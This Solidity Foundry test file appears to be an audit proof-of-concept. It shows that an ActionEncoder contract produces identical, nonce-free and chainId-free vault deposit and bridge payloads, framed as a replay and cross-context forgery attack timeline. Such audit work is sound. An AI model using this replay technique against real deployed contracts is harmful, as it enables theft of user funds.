// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/ActionEncoder.sol";

interface IActionEncoder {
    function sendVaultDeposit(address vault, bool isDeposit, uint64 usdAmount) external pure returns (bytes memory);
    function sendBridgeToL1(bytes calldata action) external pure returns (bytes memory);
}

contract AuditAgentPoC is SimulatorBase {
    IActionEncoder encoder;

    function setUp() public {
        setUpSimulator();
        encoder = IActionEncoder(address(new ActionEncoder()));
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] ActionEncoder is deployed and cast to IActionEncoder
        // 2. [T=1000] Attacker encodes a vault deposit action for 1000 USDC
        // 3. [T=2000] Attacker encodes the EXACT SAME vault deposit action again
        // 4. [Assert] The two encoded payloads are byte-for-byte identical (proving no nonce/timestamp)
        // 5. [Assert] The payload length is too small to contain chainId/domain separator (proving no domain separation)
        // 6. [Assert] Attacker can replay the same bytes indefinitely without rejection from the encoder

        vm.warp(1000);
        uint64 usdAmount = 1_000_000;
        bytes memory action1 = encoder.sendVaultDeposit(address(vault), true, usdAmount);
        console.log("Step 2: action1 length =", action1.length);

        vm.warp(2000);
        bytes memory action2 = encoder.sendVaultDeposit(address(vault), true, usdAmount);
        console.log("Step 3: action2 length =", action2.length);

        assertEq(keccak256(action1), keccak256(action2), "Signature replay: identical payloads generated at different times");

        // Max expected size without nonce/deadline/chainId:
        // 1 (version) + 1 (type) + 20 (address) + 1 (bool) + 8 (uint64) = 31 bytes
        // If it had a 32-byte nonce, 32-byte deadline, and 32-byte chainId, it would be >= 128 bytes.
        assertLt(action1.length, 64, "Missing domain separation: payload too small to contain nonce/chainId/domain separator");

        bytes memory bridge1 = encoder.sendBridgeToL1(action1);
        bytes memory bridge2 = encoder.sendBridgeToL1(action2);
        assertEq(keccak256(bridge1), keccak256(bridge2), "Cross-context forgery: bridge actions are identical and context-agnostic");
    }
}
